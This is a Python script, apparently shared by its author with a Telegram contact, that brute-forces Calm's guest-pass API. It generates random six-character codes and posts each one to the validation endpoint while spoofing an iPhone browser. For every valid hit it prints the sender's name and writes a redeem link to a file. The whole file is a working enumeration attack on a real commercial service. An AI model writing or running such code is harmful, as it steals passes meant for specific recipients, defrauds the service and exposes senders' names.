import random
import string
import requests
import colorama
import sys
import time
import io

colorama.init(autoreset=True)

sys.stdout.write(
    f"""{colorama.Fore.BLUE}
┏━━━┓ ┏━━━┓ ┏┓︱︱︱ ┏━┓┏━┓
┃┏━┓┃ ┃┏━┓┃ ┃┃︱︱︱ ┃┃┗┛┃┃
┃┃︱┗┛ ┃┃︱┃┃ ┃┃︱︱︱ ┃┏┓┏┓┃
┃┃︱┏┓ ┃┗━┛┃ ┃┃︱┏┓ ┃┃┃┃┃┃
┃┗━┛┃ ┃┏━┓┃ ┃┗━┛┃ ┃┃┃┃┃┃
┗━━━┛ ┗┛︱┗┛ ┗━━━┛ ┗┛┗┛┗┛
Welcome To calm guest 30days code gen.
Contact me on tg @Xbinner2"""
)

amount = int(input(f"\n{colorama.Fore.BLACK}Amount=> "))


def gen():
    m = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    # print(m)
    head = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
    }
    payload = {"code": m}
    r = requests.post(
        "https://www.calm.com/api/guest-pass/validate", headers=head, json=payload
    )
    # print(r.json())
    if "error" in r.text:
        sys.stdout.write(f"\n{colorama.Fore.RED}[Invalid]|{m}\n")
    else:
        sys.stdout.write(
            f'\n{colorama.Fore.GREEN}[Valid]|{m}|Sender: {r.json()["sender_name"]}|Redeem: https://www.calm.com/gp/{m}|Xbinner2\n'
        )
        with io.open("Hits.txt", "a") as f:
            f.write(f"https://www.calm.com/gp/{m}|Xbinner2\n")


def main():
    for x in range(amount):
        try:
            gen()
            time.sleep(0.3)
        except:
            pass
    print(
        f"\n{colorama.Fore.BLUE}FINISHED! Process done! Checked {colorama.Fore.RED}{amount} Tasks"
    )


if __name__ == "__main__":
    main()